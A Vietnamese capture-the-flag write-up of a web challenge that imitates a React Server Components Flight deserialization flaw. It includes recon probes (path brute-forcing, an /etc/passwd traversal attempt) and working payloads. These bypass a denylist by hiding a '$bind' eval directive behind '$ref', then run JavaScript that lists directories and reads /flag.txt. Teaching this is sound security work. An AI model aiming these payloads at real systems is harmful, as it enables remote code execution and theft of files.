# Write-up — DDC 2026 · Web Challenge 2: NebulaCommerce (RSC / "Flight v1.3")

> *"You Trusted the Technology, but Did You Check What Happened Recently?"*

| Mục | Giá trị |
|---|---|
| **Challenge** | NebulaCommerce — Server Components edition (Web) |
| **Ứng dụng mô phỏng** | React Server Components (RSC) — mô phỏng của **CVE-2025-55182 / CVE-2025-66478** ("React2Shell", CVSS 10.0) |
| **Lớp lỗ hổng** | CWE-502 (Deserialization of Untrusted Data) + CWE-184 (Incomplete List of Disallowed Inputs — denylist scoping) |
| **Kết quả** | Pre-auth RCE → đọc `/flag.txt` |
| **FLAG** | `flag{bfcecdcb-7da9-41ba-a685-cb1a2aee435c}` |
| **Endpoint khai thác** | `POST /api/flight` (Content-Type: `text/x-component`) |

<img width="1675" height="782" alt="image" src="https://github.com/user-attachments/assets/a02e70c6-de21-4c0d-bf2d-26aa21251aac" />

---

## 0. Tóm tắt challenge

Challenge triển khai một storefront thương mại điện tử được render bằng "React Server Components" với protocol tự chế gọi là **Flight v1.3** — mô phỏng trực tiếp cơ chế bị lỗi của CVE-2025-55182 (RCE trong quá trình deserialize RSC Flight payload của React 19, exploiting **bound server action**).

## 1. Xác định website có dấu hiệu liên quan đến CVE-2025-55182

Challenge không cung cấp source code phía server, vì vậy không thể bắt đầu bằng cách đọc trực tiếp logic xử lý bên trong. Thay vào đó, bước đầu tiên cần làm là quan sát giao diện, endpoint và các dấu hiệu mà ứng dụng để lộ ra bên ngoài. Mục tiêu là xác định xem bài đang mô phỏng loại lỗ hổng nào, từ đó thu hẹp hướng khai thác thay vì thử payload một cách ngẫu nhiên.

Khi truy cập trang chủ bằng request `GET /`, trang web trả về một số thông tin rất đáng chú ý:

```html
<title>NebulaCommerce — Server Components edition</title>
<span class="tag">RSC · Flight v1.3</span>
<p>The team just shipped NebulaCommerce on a brand-new RSC stack — the page tree
   is streamed from the server using our in-house Flight runtime...</p>
```
<img width="1147" height="712" alt="image" src="https://github.com/user-attachments/assets/a6fccb21-3b8a-48ae-9924-044bc6c398bd" />

Các từ khóa như React Server Components, Flight, Server Components edition và Flight runtime cho thấy ứng dụng đang mô phỏng cơ chế React Server Components. Đây là hướng rất đáng chú ý vì CVE-2025-55182 cũng liên quan đến quá trình xử lý dữ liệu của React Server Components, cụ thể là dữ liệu Flight được gửi lên server.
Ngoài ra, mô tả challenge:
"You Trusted the Technology, but Did You Check What Happened Recently?"
cũng là một gợi ý rõ ràng rằng cần chú ý đến các lỗ hổng mới xuất hiện gần đây, đặc biệt là nhóm lỗ hổng liên quan đến React 19.x và React Server Components.
CVE-2025-55182, thường được nhắc cùng CVE-2025-66478 trong Next.js, là một lỗ hổng nghiêm trọng trong quá trình deserialize dữ liệu Flight. Về bản chất, attacker có thể gửi một request độc hại tới endpoint xử lý Server Function / Server Action. Khi server deserialize dữ liệu này không an toàn, payload có thể dẫn tới thực thi mã từ xa.
Trong CVE gốc, kỹ thuật khai thác có liên quan đến cơ chế Bound Server Action, Server Reference, constructor, và quá trình resolve module trong React Flight. Vì vậy, khi thấy challenge sử dụng các khái niệm như RSC, Flight, server action, ta có cơ sở để nghi ngờ rằng bài đang mô phỏng lại hướng khai thác này dưới dạng đơn giản hơn.

## 2. Recon — Xác định surface khai thác

Sau khi xác định challenge có liên quan đến React Server Components và Flight protocol, bước tiếp theo là recon để xem ứng dụng thực sự có những endpoint nào, client giao tiếp với server ra sao và có tồn tại thêm các service hoặc hướng khai thác phụ hay không.

Mục tiêu của bước này là thu hẹp surface khai thác, tránh mất thời gian vào những hướng không liên quan và tập trung vào thành phần có khả năng chứa lỗ hổng cao nhất.

### 2.1. Kiểm tra các tài nguyên tĩnh

Trước tiên, tiến hành kiểm tra các file mà trang web tải về. Kết quả thu được:

```text
GET /                                      → 200, HTML storefront
GET /_next/static/chunks/flight-runtime.js → 200
GET /_next/static/chunks/main.js           → 200
GET /_next/static/chunks/style.css         → 200
GET /_next/static/chunks/ctfd-theme.css    → 200
```
<img width="1238" height="210" alt="image" src="https://github.com/user-attachments/assets/c2956cec-152c-44ba-b34f-559d5abad028" />

Trong đó, hai file đáng chú ý nhất là:

```text
/_next/static/chunks/flight-runtime.js
/_next/static/chunks/main.js
```

Đây là các file JavaScript chịu trách nhiệm xử lý Flight protocol và giao tiếp giữa client với server. Vì challenge không cung cấp source code backend nên các file JavaScript phía client trở thành nguồn thông tin rất quan trọng để hiểu cấu trúc request mà server mong đợi.

### 2.2. Phát hiện endpoint `/api/flight`

Qua quá trình kiểm tra ứng dụng, endpoint động đáng chú ý nhất là:

```text
/api/flight
```
<img width="1647" height="353" alt="image" src="https://github.com/user-attachments/assets/dffec9f2-1c4d-4e2b-a5c6-851da319ec68" />

Gửi request:

```http
GET /api/flight
```

Server trả về:

```text
HTTP/1.1 200 OK
Content-Type: text/x-component
```

Nội dung response có dạng:

```text
0:I"app/_next/static/chunks/flight-runtime.js"
1:M{"type":"PageRoot","props":{"title":"NebulaCommerce","children":[
   {"type":"Header",...},
   {"type":"Catalog","props":{"items":[
      {"id":"NX-001","name":"Nebula Hoodie","price":59,"stock":12}, ... ]}},
   {"type":"Footer","props":{"build":"flight-1.3.0+179250dd"}}]}}
```
<img width="1461" height="326" alt="image" src="https://github.com/user-attachments/assets/4d04b2b1-9e46-402b-997b-998d962da414" />

Response này cho thấy `/api/flight` sử dụng đúng kiểu dữ liệu Flight mà ứng dụng đã gợi ý từ đầu.

Tiếp tục thử gửi một Server Action bình thường:

```http
POST /api/flight
Content-Type: text/x-component

0:I"app/_next/static/chunks/flight-runtime.js"
1:M{"action":"addToCart","payload":{"sku":"NX-001","qty":1}}
```

Server phản hồi:

```json
{"ok":true,"model":{"action":"addToCart","payload":{"sku":"NX-001","qty":1}}}
```
<img width="852" height="345" alt="image" src="https://github.com/user-attachments/assets/051136f4-d88b-4603-90c7-00e8a8137847" />

Như vậy có thể xác nhận `/api/flight` không chỉ trả dữ liệu RSC mà còn nhận và xử lý Flight payload từ phía người dùng. Đây trở thành mục tiêu chính cần phân tích sâu hơn.

### 2.3. Kiểm tra các hướng khai thác khác

Trước khi tập trung hoàn toàn vào `/api/flight`, một số vector phổ biến khác cũng được kiểm tra để tránh bỏ sót bề mặt tấn công.

| Vector | Cách kiểm tra | Kết quả | Kết luận |
|---|---|---|---|
| Endpoint ẩn | Brute-force khoảng 120 path như `/flag`, `/admin`, `/api/*`, `.git`, `.env`, sourcemap... | 404 | Không phát hiện endpoint đáng chú ý khác |
| Path Traversal | Thử `/_next/static/chunks/..%2f..%2fetc%2fpasswd` và nhiều biến thể encode | 404 | Không khai thác được traversal |
| SSRF | Đưa URL webhook vào `$ref`, action, payload, query và header | Không có callback | Không thấy dấu hiệu server tự gửi request ra ngoài |
| XML/XXE | Gửi XML chứa external entity tới các endpoint | `no model row` hoặc trả trang chủ | Không thấy XML parser |
| WebSocket | Gửi `Upgrade: websocket` tới `/` và `/api/flight` | Response HTTP bình thường | Không sử dụng WebSocket |
| Version routing | Thử `/api/flight/v1.3`, `?v=`, `X-Flight-Version` | Không có tác dụng | Chỉ thấy một phiên bản Flight |
| Vhost phụ | Kiểm tra các Host như `admin.*`, `db.*`... | Không phát hiện service hữu ích | Không có vhost phụ đáng chú ý |
| Port scan | Kiểm tra các port phổ biến và port FRP | Các port kiểm tra đều đóng | Bề mặt chủ yếu nằm ở HTTP/HTTPS |
| CTFd platform | Kiểm tra API và chức năng đăng ký của CTFd | Redirect login / không có dữ liệu hữu ích | Không liên quan trực tiếp đến challenge |

Sau bước recon, gần như toàn bộ các hướng phụ đều không đem lại kết quả đáng chú ý. Trong khi đó, `/api/flight` vừa nhận dữ liệu do người dùng kiểm soát, vừa xử lý định dạng Flight/RSC — đúng với hướng lỗ hổng đã xác định ở bước trước.

**Kết luận bước 2:** surface khai thác quan trọng nhất của challenge là endpoint:

```text
POST /api/flight
Content-Type: text/x-component
```

Vì vậy, bước tiếp theo sẽ tập trung phân tích `flight-runtime.js` để hiểu chính xác cấu trúc Flight protocol và cách server xử lý các row trong request.

---

## 3. Phân tích Flight protocol từ client runtime

Sau bước recon, `/api/flight` được xác định là endpoint quan trọng nhất. Vì challenge không cung cấp source code phía server, file `flight-runtime.js` trở thành nguồn thông tin chính để hiểu format dữ liệu mà client gửi lên và cách các row được xử lý.

Phần đáng chú ý trong `flight-runtime.js`:

```js
/* Wire format:
 *   <rowId>:<tag><payload>\n
 *
 * tag:
 *   I = import
 *   M = model
 *   T = text
 *   E = error
 *
 * Directive công khai:
 *   { "$ref": "<rowId>" }
 */

function decode(text) {
  for (const line of text.split('\n')) {
    const i = line.indexOf(':');
    const id = line.slice(0, i);
    const tag = line.slice(i + 1)[0];
    let payload = line.slice(i + 2);

    try {
      payload = JSON.parse(payload);
    } catch (_) {}
  }
}

function reify(node, byId) {
  if (typeof node['$ref'] === 'string') {
    const r = byId.get(node['$ref']);
    return r ? reify(r.payload, byId) : null;
  }

  const out = {};
  for (const k of Object.keys(node))
    out[k] = reify(node[k], byId);

  return out;
}
```

Từ đoạn code trên có thể rút ra cơ chế chính của protocol:

- Mỗi dòng có dạng `<rowId>:<tag><payload>`.
- Row có tag `M` được sử dụng làm model chính.
- Directive `$ref` cho phép một vị trí trong model tham chiếu tới payload của row khác.
- Hàm `reify()` sẽ resolve `$ref` và đưa payload của row được tham chiếu vào model.
- Kết quả sau khi `reify()` được trả trực tiếp về client.

Ví dụ:

```text
1:M{"action":"test","payload":{"data":{"$ref":"2"}}}
2:T{"secret":"hello"}
```

Sau khi resolve `$ref`, model trở thành:

```json
{
  "action": "test",
  "payload": {
    "data": {
      "secret": "hello"
    }
  }
}
```

Điểm đáng chú ý nhất nằm ở comment:

```text
The runtime understands ONE OBJECT DIRECTIVE IN THE PUBLIC STREAM
```
<img width="1582" height="355" alt="image" src="https://github.com/user-attachments/assets/ece322ce-64f3-4344-a28f-00eb0f8dd79d" />

Việc đề bài nhấn mạnh `$ref` là directive trong **public stream** gợi ý rằng server có thể còn hỗ trợ một directive nội bộ khác mà client không công khai.

Đây trở thành hướng cần kiểm tra tiếp theo.

---

## 4. Thăm dò cách server xử lý Flight payload

Một số request được gửi thử để xác nhận hành vi thực tế của server.

### Kiểm tra `$ref`

```text
1:M{"action":"test","payload":{"x":{"$ref":"2"}}}
2:T{"secret":1}
```
<img width="881" height="225" alt="image" src="https://github.com/user-attachments/assets/822a7548-c591-4abf-8f1e-12e62512dfaa" />

Response:

```json
{"ok":true,"model":{"action":"test","payload":{"x":{"secret":1}}}}
```

Như vậy `$ref` có thể tham chiếu tới một row khác ngay trong cùng request.

Nếu `$ref` trỏ tới row không tồn tại:

```json
{"x":{"$ref":"abc"}}
```

server trả:

```json
{"x":null}
```
<img width="616" height="216" alt="image" src="https://github.com/user-attachments/assets/1873c96b-561c-4371-ad49-0a720b85354e" />

Nếu tạo tham chiếu vòng:

```text
1:M{"payload":{"$ref":"1"}}
```

server trả:

```json
{"ok":false,"error":"depth limit"}
```
<img width="608" height="140" alt="image" src="https://github.com/user-attachments/assets/4b880ddc-5690-4873-9bb9-49e8d878cd99" />

Các thử nghiệm này cho thấy phần đáng quan tâm nhất nằm ở quá trình `reify()`, vì đây là lúc server resolve dữ liệu từ các row khác vào model.

Tiếp tục thử nhiều directive có dạng `$...` như:

```text
$env
$file
$exec
$fetch
$call
$run
```

nhưng tất cả đều được server xử lý như dữ liệu bình thường.

Do challenge mô phỏng CVE-2025-55182 và cơ chế **Bound Server Action**, từ khóa tiếp theo đáng thử nhất là `$bind`.

---

## 5. Phát hiện directive ẩn `$bind`

Thử đặt `$bind` trực tiếp trong row `M`:

```http
POST /api/flight
Content-Type: text/x-component

1:M{"action":"a","payload":{"$bind":"1+1"}}
```

Server trả về:

```json
{"ok":false,"error":"directive not allowed"}
```
<img width="802" height="95" alt="image" src="https://github.com/user-attachments/assets/1349fa24-a7bd-478a-9248-472a8a5630ff" />

Response này rất quan trọng vì nó cho thấy `$bind` thực sự là một directive mà server nhận diện.

Nếu `$bind` chỉ là một key JSON bình thường, server sẽ echo lại giống các key đã thử trước đó. Thay vào đó, server trả về `directive not allowed`, chứng tỏ:

1. `$bind` tồn tại trong logic xử lý phía server.
2. Server có cơ chế chặn directive này.
3. Cơ chế kiểm tra được áp dụng khi `$bind` xuất hiện trực tiếp trong row `M`.

Vấn đề còn lại là xác định liệu việc kiểm tra này có áp dụng cho các row khác hay không.

---

## 6. Bypass denylist bằng `$ref`

Thay vì đặt `$bind` trực tiếp trong row `M`, thử đưa nó sang một row `T`, sau đó sử dụng `$ref` để đưa payload của row đó vào model.

Payload:

```text
0:T{"$bind":"1+1"}
1:M{"action":"a","payload":{"$ref":"0"}}
```

Response:

```json
{"ok":true,"model":{"action":"a","payload":2}}
```
<img width="745" height="213" alt="image" src="https://github.com/user-attachments/assets/d7ddfbbf-87e9-444d-86b0-2698e97b94b4" />

Kết quả `payload: 2` cho thấy biểu thức:

```js
1+1
```

đã được thực thi trên server.

Như vậy có thể xác định root cause của challenge:

- `$bind` bị chặn khi xuất hiện trực tiếp trong row `M`.
- Row `T` không bị kiểm tra tương tự.
- `$ref` có thể đưa payload từ row `T` vào model.
- Sau đó `reify()` xử lý `$bind` và thực thi JavaScript.

Luồng xử lý có thể hình dung như sau:

```text
Request
  │
  ├── Row T: {"$bind":"1+1"}
  │       └── không bị denylist kiểm tra
  │
  └── Row M: {"payload":{"$ref":"0"}}
          │
          └── vượt qua denylist
                  │
                  ▼
               reify()
                  │
                  ├── resolve $ref → row T
                  │
                  └── xử lý $bind
                          │
                          ▼
                     eval("1+1")
                          │
                          ▼
                          2
```

Nói cách khác, denylist được áp dụng **trước khi `$ref` được resolve**. Vì dữ liệu từ row `T` chỉ được đưa vào model sau bước kiểm tra nên `$bind` có thể đi qua mà không bị phát hiện.

Đây chính là điểm cho phép bypass cơ chế bảo vệ và dẫn tới RCE.

---

## 7. Khai thác RCE và đọc flag

Sau khi chứng minh `$bind` có thể thực thi JavaScript, tiến hành kiểm tra môi trường server.

### 7.1. Xác nhận khả năng thực thi mã

Payload:

```text
0:T{"$bind":"process.version"}
1:M{"action":"a","payload":{"$ref":"0"}}
```

Response:

```json
{"ok":true,"model":{"action":"a","payload":"v20.20.2"}}
```
<img width="641" height="161" alt="image" src="https://github.com/user-attachments/assets/c6611c4e-3495-4d8c-969b-4c36b7f3c320" />

Tiếp tục kiểm tra thư mục làm việc:

```text
0:T{"$bind":"process.cwd()"}
1:M{"action":"a","payload":{"$ref":"0"}}
```

Kết quả:

```text
/opt/app
```
<img width="756" height="237" alt="image" src="https://github.com/user-attachments/assets/0b038f65-da99-43fc-a145-5a86f268e03a" />

Như vậy đã xác nhận payload được thực thi trực tiếp trong tiến trình Node.js phía server.

### 7.2. Tìm file flag

Liệt kê thư mục `/`:

```text
0:T{"$bind":"require('fs').readdirSync('/').join(',')"}
1:M{"action":"a","payload":{"$ref":"0"}}
```

Response chứa:

```text
.dockerenv,bin,dev,etc,flag.txt,home,lib,media,mnt,opt,proc,root,...
```
<img width="1482" height="267" alt="image" src="https://github.com/user-attachments/assets/609dafaf-1103-42c3-92c0-f77189eaa85f" />

Từ đó xác định flag nằm tại:

```text
/flag.txt
```

### 7.3. Đọc flag

Payload cuối cùng:

```http
POST /api/flight
Content-Type: text/x-component

0:T{"$bind":"require('fs').readFileSync('/flag.txt','utf8')"}
1:M{"action":"a","payload":{"$ref":"0"}}
```

Server trả về:

```json
{
  "ok": true,
  "model": {
    "action": "a",
    "payload": "flag{bfcecdcb-7da9-41ba-a685-cb1a2aee435c}"
  }
}
```
<img width="1132" height="197" alt="image" src="https://github.com/user-attachments/assets/c3eb3e58-527b-4c87-807e-132f15b2cab7" />

## FLAG

```text
flag{bfcecdcb-7da9-41ba-a685-cb1a2aee435c}
```

**Tóm lại, chuỗi khai thác của challenge là:**

```text
Flight payload
    ↓
$bind bị chặn trong row M
    ↓
đưa $bind sang row T
    ↓
row M dùng $ref tham chiếu row T
    ↓
denylist không kiểm tra lại dữ liệu sau khi resolve
    ↓
reify() xử lý $bind
    ↓
thực thi JavaScript trên server
    ↓
đọc /flag.txt
```


